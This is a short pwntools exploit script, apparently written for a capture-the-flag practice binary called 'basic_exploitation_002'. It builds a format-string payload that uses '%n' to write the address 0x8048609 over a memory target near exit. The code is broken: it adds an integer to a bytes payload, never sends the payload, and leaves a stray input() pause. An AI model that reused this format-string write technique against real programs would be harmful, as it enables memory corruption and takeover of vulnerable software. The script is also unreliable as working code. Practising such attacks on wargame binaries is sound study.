from pwn import *

context.binary = exe = ELF('./basic_exploitation_002', checksec = False)
p = process(exe.path)

input()
exit_addr = 0xf7dbdbd0
payload = f'%{0x8048609}c%6$n'.encode()
payload = payload.ljust(0x10, b'P')
payload += exit_addr

p.interactive()